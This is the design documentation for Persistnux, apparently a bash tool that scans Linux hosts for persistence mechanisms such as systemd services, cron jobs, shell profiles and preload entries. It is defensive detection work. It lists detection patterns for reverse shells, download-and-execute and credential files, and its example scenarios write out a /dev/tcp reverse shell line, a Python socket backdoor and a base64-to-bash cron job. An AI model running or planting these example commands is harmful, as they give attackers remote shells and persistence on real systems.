# Persistnux Detection Logic Tree

## Version 2.0.0

This document describes the complete detection and analysis logic flow.

---

## Use Cases

### 1. Incident Response - Post-Compromise Analysis
```bash
# Full scan with all findings for forensic analysis
sudo ./persistnux.sh --all

# Output: Complete inventory of all persistence mechanisms
# Use: Compare against known-good baseline, identify anomalies
```

### 2. Threat Hunting - Proactive Search
```bash
# Focus on HIGH/CRITICAL findings only
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh

# Output: Only suspicious findings requiring immediate investigation
# Use: Quick triage during active threat hunt
```

### 3. Security Audit - Compliance Check
```bash
# Standard suspicious-only scan
sudo ./persistnux.sh

# Output: MEDIUM, HIGH, CRITICAL findings
# Use: Regular security audits, identify misconfigurations
```

### 4. Baseline Creation
```bash
# Capture all persistence points on clean system
sudo FILTER_MODE=all ./persistnux.sh
mv persistnux_output/ baseline_$(date +%Y%m%d)/

# Later: Compare against baseline
diff baseline_*/persistnux_*.csv current_scan/persistnux_*.csv
```

---

## Detection Module Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    PERSISTNUX EXECUTION FLOW                     │
├─────────────────────────────────────────────────────────────────┤
│  1. Initialize   → Parse args, create output files              │
│  2. Build Patterns → Compile regex for fast matching            │
│     ├── COMBINED_NEVER_WHITELIST_PATTERN (always-flag)          │
│     ├── COMBINED_COMMAND_PATTERN (suspicious commands)          │
│     ├── COMBINED_NETWORK_PATTERN (network indicators)           │
│     └── UNIFIED_SUSPICIOUS_PATTERN = union of all three         │
│  3. Run 7 Detection Modules (sequential)                        │
│  4. Output → CSV + JSONL with matched patterns                  │
│  5. Cleanup → Remove temp files                                 │
└─────────────────────────────────────────────────────────────────┘

Detection Modules:
  [1/7] Systemd Services    → .service files, ExecStart analysis
  [2/7] Cron Jobs           → System/user crontabs, at jobs
  [3/7] Shell Profiles      → .bashrc, .profile, /etc/profile.d
  [4/7] Init Scripts        → rc.local, /etc/init.d
  [5/7] Kernel/Preload      → ld.so.preload, kernel modules
  [6/7] Additional          → XDG autostart, sudoers, PAM, MOTD
  [7/7] Backdoor Locations  → Package managers, git, webshells
```

---

## Confidence Level Definitions

| Level | Meaning | Action Required |
|-------|---------|-----------------|
| **LOW** | Baseline system config, package-managed | Informational only |
| **MEDIUM** | Potentially suspicious, needs review | Manual review recommended |
| **HIGH** | Suspicious patterns detected | Investigate immediately |
| **CRITICAL** | Modified package files, SUID+suspicious, likely compromise | Incident response required |

### Automatic Escalation Rules (v2.0.0)

- **MEDIUM → HIGH**: File modified within last 7 days
- **HIGH → CRITICAL**: SUID or SGID bit set (`rwsr-xr-x` / `rwxr-sr-x`) on a suspiciously-matching file
- **ANY → CRITICAL**: Package verification failure (dpkg/rpm --verify reports file modified)

---

## Pattern Architecture (v2.0.0)

### Pattern Arrays (Authoritative Source)

All patterns are defined in bash arrays at the top of the script. These are the **single source of truth** — all runtime patterns are derived from them.

```
NEVER_WHITELIST_PATTERNS[]    → Always flag, regardless of package status
SUSPICIOUS_COMMANDS[]         → Common attack command patterns
SUSPICIOUS_NETWORK_PATTERNS[] → Network/shell indicator patterns
SUSPICIOUS_LOCATIONS[]        → Filesystem paths that are always suspicious
```

### build_combined_patterns() — Startup Derivation

At startup, `build_combined_patterns()` joins each array into a pipe-delimited combined regex and builds the unified gate:

```bash
IFS='|'
COMBINED_NEVER_WHITELIST_PATTERN="${NEVER_WHITELIST_PATTERNS[*]}"
COMBINED_COMMAND_PATTERN="${SUSPICIOUS_COMMANDS[*]}"
COMBINED_NETWORK_PATTERN="${SUSPICIOUS_NETWORK_PATTERNS[*]}"

# UNIFIED is derived — never hardcoded
UNIFIED_SUSPICIOUS_PATTERN="${COMBINED_NEVER_WHITELIST_PATTERN}|${COMBINED_COMMAND_PATTERN}|${COMBINED_NETWORK_PATTERN}"
```

**Key invariant:** Any pattern added to an array is automatically included in UNIFIED and all combined patterns. There is no separate string to maintain.

### quick_suspicious_check() — First Gate

Before any deep analysis, every command/file is tested against UNIFIED_SUSPICIOUS_PATTERN in a single `grep -qiE` call. If no match, analysis stops immediately. This eliminates the bulk of subprocess overhead for clean files.

```
Input command → grep -qiE "$UNIFIED_SUSPICIOUS_PATTERN"
                     │
            ┌────────┴────────┐
           MISS              HIT
            │                 │
        SKIP all           Continue to
        analysis           specific checks
```

---

## Module 1: Systemd Services Detection Tree

```
┌─────────────────────────────────────────────────────────────────┐
│              SYSTEMD SERVICE ANALYSIS (v2.0.0)                  │
│         Only scans .service files (not .socket/.timer)          │
│         Only scans enabled services (disabled = not a risk)     │
│                                                                 │
│  OPTIMIZATION: Package verification FIRST, skip analysis if OK  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ SCAN PATHS:                                                     │
│   /etc/systemd/system     /usr/lib/systemd/system               │
│   /lib/systemd/system     /run/systemd/system                   │
│   /etc/systemd/user       ~/.config/systemd/user                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │   For each .service file:     │
              │   Extract: ExecStart=<cmd>    │
              │   Get: enabled status, age    │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │   Is ExecStart present?       │
              └───────────────────────────────┘
                     │              │
                    YES            NO
                     │              │
                     │              ▼
                     │    ┌────────────────────────┐
                     │    │ Check service file     │
                     │    │ package status:        │
                     │    │ • Verified → LOW       │
                     │    │ • Modified → CRITICAL  │
                     │    │ • Unmanaged → MEDIUM   │
                     │    └────────────────────────┘
                     │
                     ▼
         ┌──────────────────────────────────┐
         │     Extract executable from       │
         │     ExecStart command             │
         └──────────────────────────────────┘
                     │
                     ▼
    ┌────────────────────────────────────────┐
    │   Is executable an INTERPRETER?        │
    │   (python, perl, ruby, bash, sh, etc.) │
    └────────────────────────────────────────┘
           │                        │
          YES                       NO
           │                        │
           ▼                        ▼

═══════════════════════════════════════════════════════════════════
                    INTERPRETER PATH
═══════════════════════════════════════════════════════════════════

    ┌────────────────────────────────────────┐
    │ 1. Check interpreter binary itself     │
    │                                        │
    │ Is /usr/bin/python3 compromised?       │
    │   • Modified package → CRITICAL        │
    │   • Unmanaged from odd path → HIGH     │
    └────────────────────────────────────────┘
                     │
                     ▼
    ┌────────────────────────────────────────┐
    │ 2. Extract script path from args       │
    │                                        │
    │ ExecStart=/usr/bin/python3 /opt/app.py │
    │                              ▲          │
    │               THIS is what we analyze  │
    └────────────────────────────────────────┘
                     │
         ┌───────────┴───────────┐
         │                       │
    Script found            No script (inline -c)
         │                       │
         ▼                       ▼
    ┌────────────────┐    ┌──────────────────────┐
    │ Check SCRIPT's │    │ Inline code          │
    │ package status │    │ python -c "..."      │
    │ FIRST!         │    │ → analyze_inline_code│
    └────────────────┘    │ → HIGH               │
         │                └──────────────────────┘
    ┌────┴────┬──────────────┐
    │         │              │
 Verified  Modified     Unmanaged
    │         │              │
    ▼         ▼              ▼
┌──────┐  ┌────────┐  ┌──────────────────┐
│ LOW  │  │CRITICAL│  │ analyze_script_  │
│ DONE │  │ DONE   │  │ content():       │
│ SKIP │  │        │  │ • NEVER_WHITELIST│
│ REST │  │        │  │ • commands       │
└──────┘  └────────┘  │ • multiline      │
                      │ • encoding       │
                      │ • entropy+exec   │
                      │ Suspicious →HIGH │
                      └──────────────────┘


═══════════════════════════════════════════════════════════════════
                    DIRECT BINARY PATH
═══════════════════════════════════════════════════════════════════

    ┌────────────────────────────────────────┐
    │ 1. Check package status FIRST          │
    │                                        │
    │    dpkg -S /usr/sbin/sshd              │
    │    dpkg --verify openssh-server        │
    └────────────────────────────────────────┘
                     │
    ┌────────────────┼────────────────┐
    │                │                │
 Verified        Modified        Unmanaged
    │                │                │
    ▼                ▼                ▼
┌──────────┐   ┌──────────┐   ┌───────────────────┐
│   LOW    │   │ CRITICAL │   │ Continue with     │
│   DONE   │   │   DONE   │   │ full analysis...  │
│          │   │          │   │                   │
│ ★ SKIP   │   │          │   │                   │
│ ALL      │   │          │   │                   │
│ PATTERN  │   │          │   │                   │
│ ANALYSIS │   │          │   │                   │
└──────────┘   └──────────┘   └───────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 2. Location check               │
                   │    /tmp, /dev/shm → HIGH        │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 3. If script, analyze content   │
                   │    Suspicious patterns → HIGH   │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 4. Pattern match on ExecStart   │
                   │    curl|bash, /dev/tcp → HIGH   │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 5. Time-based check             │
                   │    Recent + enabled → HIGH      │
                   └──────────────────────────────────┘


═══════════════════════════════════════════════════════════════════
                    PERFORMANCE IMPACT
═══════════════════════════════════════════════════════════════════

BEFORE (old flow):
  For EVERY service file:
    1. grep dangerous patterns     ← subprocess
    2. grep suspicious patterns    ← 4+ subprocess calls
    3. check is_command_safe       ← package check here (late!)
    4. more analysis...

AFTER (optimized):
  For EVERY service file:
    1. Extract executable
    2. Check package status        ← EARLY EXIT if verified
       └─ Verified? → LOW, DONE    ← Skip all grep calls!

  Typical system: ~200 services, ~180 are package-managed
  BEFORE: 200 × (5+ grep calls) = 1000+ subprocesses
  AFTER:  200 × (1 dpkg call) + 20 × (5 grep calls) = 300 calls

  ≈ 70% reduction in subprocess spawning!
```

---

## Script Content Analysis (v2.0.0)

`analyze_script_content()` is called for unmanaged scripts to determine if content is suspicious.

### Content Sampling Strategy

For files of any size, content is read in up to **three zones**:

```
┌─────────────────────────────────────────────────────────────────┐
│  File size ≤ 1000 lines:   read entire file                     │
│                                                                 │
│  File size > 1000 lines:   head-1000 + tail-200                 │
│                                                                 │
│  File size > 1200 lines:   head-1000 + mid-200 + tail-200       │
│                             (mid = lines [N/2-100 .. N/2+99])   │
└─────────────────────────────────────────────────────────────────┘
```

This three-zone approach ensures that content buried in the middle of large scripts (lines 1001 to N-200) is not missed.

### Comment Stripping

Before any pattern check, a clean copy is derived:

```bash
script_content_clean=$(echo "$script_content" | grep -Ev '^[[:space:]]*#')
```

All NEVER_WHITELIST, COMBINED_COMMAND, multiline, encoding, and most other checks run against `script_content_clean`. This prevents false positives from commented-out educational code (e.g., `# Example: curl | bash`).

### Analysis Checks (in order)

```
1. NEVER_WHITELIST check        → CRITICAL match → return immediately
2. COMBINED_COMMAND check       → suspicious command match
   └── If interpreter -c/-e:   → call analyze_inline_code()
3. COMBINED_NETWORK check       → network tool match
4. Multiline pattern check      → multi-statement obfuscation
5. Hex/octal/ANSI-C encoding    → obfuscated string literals
6. tr-based cipher patterns     → ROT13/ROT47 decode-to-shell
7. rev decode patterns          → rev <<< string | bash
8. High-entropy + exec context  → base64 blobs next to eval/exec
9. Base64 encoded content       → decode and re-analyze
```

### Entropy Detection (v2.0.0 — reduced FP)

Standalone high-entropy strings are **not** flagged (too many false positives from TLS certs, UUIDs, API keys). Entropy is only flagged as `high_entropy_exec` when the same line also contains an execution context:

```
High-entropy value on same line as:
  eval | exec | base64.*-d | bash | sh -c | openssl.*-d
        → MATCH: high_entropy_exec
Otherwise:
        → SKIP (not suspicious alone)
```

### Inline Code Analysis (v2.0.0)

When a matched line contains an interpreter with a `-c` or `-e` flag, `analyze_inline_code()` is called to extract and analyze the argument:

```bash
# Trigger: line contains interpreter + -c/-e flag
if echo "$full_line" | grep -qiE '(bash|sh|dash|zsh|python[0-9.]*|perl[0-9.]*|ruby[0-9.]*)[[:space:]].*-[ce][[:space:]]'; then
    analyze_inline_code "$full_line"
fi
```

`analyze_inline_code()` extracts the quoted argument (single or double quoted), runs the same suspicious pattern battery against the extracted code, and sets `MATCHED_PATTERN="script_suspicious+inline:${INLINE_CODE_REASON}"`.

---

## Pattern Matching Logic

### Pattern Categories and Examples

```
┌─────────────────────────────────────────────────────────────────┐
│                    PATTERN MATCHING FLOW                        │
└─────────────────────────────────────────────────────────────────┘

Input: ExecStart="/usr/bin/python3 -c 'import socket;s=socket.socket()'"

                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ COMBINED PATTERN CHECK (Fast Path)                              │
│                                                                 │
│ Build combined regex from all patterns in category:             │
│   (pattern1|pattern2|pattern3|...)                              │
│                                                                 │
│ Single grep -qE check - if no match, skip category              │
└─────────────────────────────────────────────────────────────────┘
                              │
                         Match Found
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ SPECIFIC PATTERN IDENTIFICATION                                 │
│                                                                 │
│ Loop through individual patterns to find exact match:           │
│   Pattern: "python.*socket\.socket"                             │
│   Match:   "python3 -c 'import socket;s=socket.socket"          │
│                                                                 │
│ Set globals:                                                    │
│   MATCHED_PATTERN = "python.*socket\.socket"                    │
│   MATCHED_CATEGORY = "command"                                  │
│   MATCHED_STRING = "python3 -c 'import socket;s=socket.socket"  │
└─────────────────────────────────────────────────────────────────┘
```

### NEVER_WHITELIST Patterns (Always HIGH/CRITICAL)

These patterns ALWAYS trigger regardless of package management status:

```
Category: Reverse Shell Indicators
├── /dev/tcp/              # Bash network pseudo-device
├── /dev/udp/              # Bash network pseudo-device
├── bash -i                # Interactive shell (reverse shell classic)
├── sh -i                  # Interactive shell
├── nc -e                  # Netcat execute
├── nc .*-e                # Netcat execute (alternate flag order)
├── ncat -e                # Ncat execute
├── busybox nc.*-e         # BusyBox netcat execute
├── busybox.*(sh|bash).*-[ice]  # BusyBox shell invocation
├── \| *nc                 # Piping to netcat
├── \| *bash\b             # Piping to bash
├── \| *sh\b               # Piping to sh
├── \| */bin/sh            # Piping to /bin/sh
├── \| */bin/bash          # Piping to /bin/bash
├── >&[ ]*/dev/            # Redirect to /dev (shell trick)
├── exec [0-9]*<>/dev/     # Bidirectional fd to /dev/tcp

Category: Decode-to-Shell Obfuscation
├── rev.*\|.*(bash|sh|exec)  # rev-encoded payload piped to shell
├── tr.*[A-Za-z].*\|.*(bash|sh)  # ROT13/ROT47 decode piped to shell
├── tr.*['"].*['"].*\|.*(bash|sh) # tr cipher variant piped to shell
├── dd.*\|.*(bash|sh)      # dd-based payload delivery
├── cat.*<<.*EOF.*bash     # Heredoc piped to bash
├── base64.*-d.*<<.*EOF    # Base64 heredoc decode
├── eval.*<<.*EOF          # Eval heredoc

Category: Socket Operations
├── python.*socket\.socket # Python socket creation
├── python.*socket.*connect
├── perl.*socket.*connect
├── ruby.*TCPSocket
├── ruby.*Socket\.new

Category: Network Tools
├── socat.*exec:           # Socat with exec
├── socat.*TCP:            # Socat TCP
├── telnet.*\|.*(bash|sh)  # Telnet piped to shell
├── xterm -display         # X11 forwarding abuse
├── nohup .*/tmp/          # Persistent background exec from /tmp
├── nohup .*/dev/shm/      # Persistent background exec from /dev/shm
├── tftp.*-g               # TFTP download

Category: Named Pipes / Staging
├── mknod.*backpipe
└── mkfifo.*/( tmp|dev/shm|var/tmp)

Category: Source from Temp
├── source .*/tmp/
├── source .*/dev/shm/
├── \. .*/tmp/
└── \. .*/dev/shm/
```

### SUSPICIOUS_COMMANDS Patterns

```
Category: Download & Execute
├── curl.*\|.*bash         # curl | bash
├── curl.*\|.*sh           # curl | sh
├── wget.*\|.*bash         # wget | bash
├── wget.*\|.*sh           # wget | sh
├── `curl.*\|.*bash        # Backtick curl | bash
├── `wget.*\|.*bash        # Backtick wget | bash
├── curl.* sh -c           # curl output to sh -c
├── wget.* sh -c           # wget output to sh -c
├── curl.*-o.*/tmp         # Download to /tmp
├── curl.*-o.*/dev/shm     # Download to /dev/shm
├── wget.*-O.*/tmp         # Download to /tmp
└── wget.*-O.*/dev/shm     # Download to /dev/shm

Category: Permission Manipulation
├── chmod \+x.*/tmp        # Executable in /tmp
├── chmod \+x.*/dev/shm    # Executable in /dev/shm
└── chmod 777[[:space:]]   # World-writable (exact, avoids FP on 7770)

Category: Obfuscation/Encoding
├── base64 -d              # Base64 decode
├── base64 --decode        # Base64 decode (long form)
├── eval.*\\\$.*base64     # Eval base64 decoded content
├── echo.*\|.*base64.*-d   # Echo to base64 decode
└── openssl.*-d.*-base64   # OpenSSL base64 decode

Category: Inline Code Execution
├── python.*-c.*import.*(socket|subprocess|pty|ctypes|
│       os\.system|popen|base64|exec\b|eval\b)
│                          # Python one-liner: only dangerous imports
│                          # (import sys, import re → NOT flagged)
├── python.*-c.*exec\(     # Python inline exec()
├── perl -e                # Perl one-liner
├── ruby -e                # Ruby one-liner
├── php -r                 # PHP one-liner
└── php.*fsockopen         # PHP socket connection

Category: Sensitive File Access
├── /etc/shadow
├── /etc/passwd
├── /root/.ssh
├── id_rsa
└── authorized_keys
```

### SUSPICIOUS_LOCATIONS Patterns

```
^/dev/shm/                 # Shared memory (volatile, no audit log)
^/tmp/                     # Temp directory
^/var/tmp/                 # Persistent temp
/\.[a-z]                   # Hidden files/dirs
\.\./\.\.                  # Path traversal
```

---

## Package Management Detection (v2.0.0)

### is_package_managed() Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                  PACKAGE STATUS DETECTION                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                    Check PKG_CACHE first
                         │        │
                     HIT │        │ MISS
                         ▼        ▼
                    Return      Continue detection
                    cached
                              │
                ┌─────────────┼─────────────┐
                │             │             │
           dpkg -S        rpm -qf      pacman -Qo
                │
        ┌───────┴───────┐
        │               │
    Package found   Not found
        │               │
        ▼               ▼
   dpkg --verify   → Check snap:
    (integrity)      /snap/ (any path)  ← covers ~/snap/ user installs
        │            /var/lib/snapd/
   ┌────┴────┐
   │         │
 PASS    FAIL (modified)
   │         │
 "dpkg:  "dpkg:pkg:
  pkg"   MODIFIED"

                    → Check flatpak:
                      /var/lib/flatpak/
                      ~/.local/share/flatpak/

                    → Check runtime-managed:
                      /node_modules/         ← npm packages
                      /site-packages/        ← Python pip packages
                      /dist-packages/        ← Python system packages
                      /.cargo/registry/      ← Rust crates (installed)
                      /.cargo/bin/           ← Rust binaries
                      /go/pkg/mod/           ← Go modules
                      /gems/gems/            ← Ruby gems

                    → Not matched → "unmanaged"
```

### adjust_confidence_for_package()

| Package Status | HIGH input | MEDIUM input | LOW input |
|---------------|------------|--------------|-----------|
| `dpkg:pkg:MODIFIED` | CRITICAL | CRITICAL | CRITICAL |
| `verified` (dpkg/rpm/pacman) | MEDIUM | LOW | LOW |
| `snap:pkg` | MEDIUM | LOW | LOW |
| `flatpak:pkg` | MEDIUM | LOW | LOW |
| `runtime-managed` | MEDIUM | LOW | LOW |
| `unmanaged` | HIGH | MEDIUM | LOW |

---

## Module 3: Shell Profiles Detection (v2.0.0)

```
SCAN LOCATIONS:
├── System profiles: /etc/profile, /etc/bash.bashrc, /etc/zsh/zshrc,
│     /etc/profile.d/*.sh, /etc/fish/config.fish
├── User profiles: ~/.bashrc, ~/.bash_profile, ~/.profile, ~/.zshrc,
│     ~/.config/fish/config.fish  (for each user in /etc/passwd)
└── Global XDG: /etc/environment, /etc/xdg/autostart

For each profile:
  1. Check package status → is_package_managed()
     │
     ├── verified  → LOW
     ├── modified  → CRITICAL
     └── unmanaged → analyze content:

  2. Parse for sourced files / exec commands
     └── For each extracted command:
           → quick_suspicious_check()
           → analyze_inline_code() if -c/-e flag
           → analyze_script_content() if script path

  3. Time-based elevation (ALL 4 loops):
     │  mod_time extracted from metadata
     │  days_old < 7 AND confidence == MEDIUM
     └→ confidence = HIGH

  4. add_finding() with package_status in metadata
```

---

## Module 2: Cron Detection Logic

```
┌─────────────────────────────────────────────────────────────────┐
│                     CRON ANALYSIS FLOW                          │
└─────────────────────────────────────────────────────────────────┘

SCAN LOCATIONS:
├── /etc/crontab           # System crontab
├── /etc/cron.d/*          # System cron jobs
├── /etc/cron.daily/*      # Daily scripts
├── /etc/cron.hourly/*     # Hourly scripts
├── /etc/cron.weekly/*     # Weekly scripts
├── /etc/cron.monthly/*    # Monthly scripts
├── /var/spool/cron/*      # User crontabs
└── at jobs (atq)          # Scheduled one-time jobs

For each cron file/entry:
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Check for suspicious content: │
              │ UNIFIED_SUSPICIOUS_PATTERN    │
              │ (derived from all arrays)     │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Check modification age:       │
              │ < 7 days + MEDIUM → HIGH      │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ If cron is a script:          │
              │ → run analyze_script_content  │
              │ → check for interpreters      │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Adjust for package management │
              │ Package-managed → Lower conf  │
              └───────────────────────────────┘
```

---

## Modules 4-7: Other Detection Modules

### Init Scripts (Module 4)
```
SCAN: /etc/rc.local, /etc/init.d/*, /etc/rc*.d/*
CHECK: Suspicious commands in startup scripts via UNIFIED pattern
CONFIDENCE: curl/wget/nc in init → HIGH
```

### Kernel/Preload (Module 5)
```
SCAN: /etc/ld.so.preload, /etc/ld.so.conf.d/*, lsmod
CHECK: LD_PRELOAD entries, loaded kernel modules
CONFIDENCE: Non-empty ld.so.preload → HIGH
```

### Additional Persistence (Module 6)
```
SCAN: XDG autostart, /etc/environment, sudoers, PAM, MOTD
CHECK: Suspicious exec lines, LD_PRELOAD in env
PAM: Verifies module .so files using is_package_managed()
     Modified → CRITICAL, Unmanaged → HIGH
CONFIDENCE: Context-dependent
```

### Backdoor Locations (Module 7)
```
SCAN: APT/YUM configs, git configs, web directories
CHECK: Webshell patterns (eval, base64_decode, system())
CONFIDENCE: Recently modified + webshell patterns → HIGH
```

---

## Output Schema

### CSV Columns (v2.0.0)
```
timestamp,hostname,category,confidence,file_path,file_hash,
file_owner,file_permissions,file_age_days,package_status,
command,enabled_status,description,matched_pattern,matched_string
```

### JSONL Fields
```json
{
  "timestamp": "2026-02-24T10:30:00Z",
  "hostname": "server01",
  "category": "Systemd Service",
  "confidence": "HIGH",
  "file_path": "/etc/systemd/system/backdoor.service",
  "file_hash": "abc123...",
  "file_owner": "root:root",
  "file_permissions": "644",
  "file_age_days": "3",
  "package_status": "unmanaged",
  "command": "/usr/bin/python3 -c 'import socket...'",
  "enabled_status": "enabled",
  "description": "backdoor.service",
  "matched_pattern": "python.*socket\\.socket",
  "matched_string": "python3 -c 'import socket"
}
```

---

## Example Detection Scenarios

### Scenario 1: Reverse Shell Service
```
Input:  /etc/systemd/system/update.service
        ExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

Detection Path:
  1. Extract ExecStart
  2. quick_suspicious_check() → HIT on "bash -i" and "/dev/tcp/"
  3. NEVER_WHITELIST match → CRITICAL
     matched_pattern: "/dev/tcp/"
     matched_string: "/bin/bash -i >& /dev/tcp/10.0.0.1/4444"
```

### Scenario 2: Python Backdoor Script
```
Input:  /etc/systemd/system/monitor.service
        ExecStart=/usr/bin/python3 /opt/monitor.py

        /opt/monitor.py contains:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.0.0.1", 4444))

Detection Path:
  1. Extract ExecStart
  2. is_package_managed(/opt/monitor.py) → unmanaged
  3. analyze_script_content(/opt/monitor.py)
     → Comment stripping applied
     → NEVER_WHITELIST: socket\.socket → MATCH
  4. Result: HIGH confidence
     matched_pattern: "python.*socket\.socket"
     matched_string: "s = socket.socket("
```

### Scenario 3: Legitimate Package-Managed Service
```
Input:  /lib/systemd/system/ssh.service
        ExecStart=/usr/sbin/sshd -D

Detection Path:
  1. Extract ExecStart
  2. quick_suspicious_check() → MISS → skip analysis
  3. is_package_managed(/usr/sbin/sshd)
     → dpkg -S → openssh-server
     → dpkg --verify → PASS (unmodified)
  4. Result: LOW confidence (filtered in default mode)
```

### Scenario 4: Modified System Binary (Rootkit)
```
Input:  /lib/systemd/system/cron.service
        ExecStart=/usr/sbin/cron -f

        /usr/sbin/cron has been replaced (rootkit)

Detection Path:
  1. Extract ExecStart
  2. is_package_managed(/usr/sbin/cron)
     → dpkg -S → cron
     → dpkg --verify cron → MODIFIED
  3. adjust_confidence_for_package() → CRITICAL
     package_status: "dpkg:cron:MODIFIED"
```

### Scenario 5: Base64 Obfuscated Cron Job
```
Input:  /etc/cron.d/backup
        * * * * * root echo 'YmFzaCAtaQ==' | base64 -d | bash

Detection Path:
  1. Read cron content, apply comment stripping
  2. NEVER_WHITELIST: "\| *bash" → MATCH
  3. SUSPICIOUS_COMMANDS: "echo.*\|.*base64.*-d" → MATCH
  4. Result: HIGH confidence
     matched_pattern: "\| *bash"
     matched_string: "| bash"
```

### Scenario 6: Safe Python Import (No False Positive)
```
Input:  /etc/cron.d/metrics
        * * * * * root python3 -c 'import sys; print(sys.version)'

Detection Path:
  1. quick_suspicious_check() → checks UNIFIED pattern
  2. "python.*-c.*import" would match — but pattern is:
     "python.*-c.*import.*(socket|subprocess|pty|ctypes|...)"
     → "import sys" does NOT match the dangerous-module sub-pattern
  3. No other patterns match
  4. Result: LOW / MISS → no finding
```

### Scenario 7: SUID Binary with Suspicious Match
```
Input:  /usr/local/bin/update-helper
        permissions: rwsr-xr-x (SUID set)
        Content matches: "curl.*\|.*bash"

Detection Path:
  1. analyze_script_content() → MATCH → HIGH
  2. add_finding_new() detects file_permissions =~ [sS]
     → confidence HIGH → CRITICAL escalation
  3. Result: CRITICAL confidence
     matched_pattern: "curl.*|.*bash+suid_sgid"
```

### Scenario 8: Recently Modified Shell Profile
```
Input:  /home/user/.bashrc
        Modified 2 days ago
        Contains: PATH modification (MEDIUM confidence)

Detection Path:
  1. check_shell_profiles() → user profile loop
  2. analyze content → confidence=MEDIUM
  3. Time check: days_old=2 < 7 AND confidence==MEDIUM
     → confidence = HIGH
  4. Result: HIGH confidence
     matched_pattern: "recent_modification"
     matched_string: "2 days old"
```

---

## Performance Optimizations

### SCAN_EPOCH Hoisting
```
BEFORE: stat --format="%Y" "$file" called per-file at scan time
AFTER:  SCAN_EPOCH=$(date +%s) captured once at startup
        Per-file: age_days=$(( (SCAN_EPOCH - file_mtime) / 86400 ))
```

### Package Manager Cache
```
First lookup:  dpkg -S /usr/bin/python3 → python3
               Cache: PKG_CACHE["/usr/bin/python3"]="dpkg:python3"

Subsequent:    Cache hit → Skip dpkg call
               Return cached result immediately

Separate PKG_VERIFY_CACHE caches dpkg --verify results
(ownership lookup and integrity check cached independently)
```

### systemctl Cache
```
At startup: init_systemctl_cache() runs:
  systemctl list-units --all --no-pager → SYSTEMCTL_CACHE associative array
  Per-service enabled check: O(1) cache lookup instead of systemctl subprocess
```

### calculate_entropy — Single awk Pass
```
BEFORE: External program + bash arithmetic (multiple subprocesses)
AFTER:  awk one-liner computes Shannon entropy in a single pass
        No external dependencies
```

### Combined Pattern Matching
```
Instead of:
  for pattern in patterns; do
    grep -qE "$pattern"   # N subprocess calls
  done

Now:
  combined="(pattern1|pattern2|...)"
  grep -qE "$combined"    # 1 subprocess call
  if match:
    # Only then loop to find specific pattern
```

### Tail Scan for Large Scripts
```
Files > 1000 lines: read head-1000 + tail-200
Files > 1200 lines: also read mid-200 (N/2 ± 100)
Avoids reading entire multi-MB scripts into memory
```

---

## Filter Modes

```
┌─────────────────────────────────────────────────────────────────┐
│                      FILTER MODE LOGIC                          │
└─────────────────────────────────────────────────────────────────┘

Default: FILTER_MODE=suspicious_only
  → Show: MEDIUM, HIGH, CRITICAL
  → Hide: LOW

--all flag: FILTER_MODE=all
  → Show: LOW, MEDIUM, HIGH, CRITICAL

MIN_CONFIDENCE=HIGH:
  → Show: HIGH, CRITICAL only
  → Hide: LOW, MEDIUM

Combination: MIN_CONFIDENCE=HIGH --all
  → Show: HIGH, CRITICAL
  → (--all has no effect when MIN_CONFIDENCE is set)
```

---

## Quick Reference: What Triggers Each Confidence Level

| Confidence | Triggers |
|------------|----------|
| **CRITICAL** | Modified package files (dpkg/rpm verify failed); SUID/SGID bit + suspicious pattern match |
| **HIGH** | NEVER_WHITELIST pattern match; reverse shell indicators; download+execute; obfuscation with execution context; suspicious script content; inline -c/-e code; recent modification (<7d) of MEDIUM-confidence file; suspicious locations |
| **MEDIUM** | Unmanaged files with ambiguous content; unusual but non-definitive configurations |
| **LOW** | Package-managed and integrity-verified files; known-good paths; runtime-managed packages (npm/pip/cargo/go/gems) |
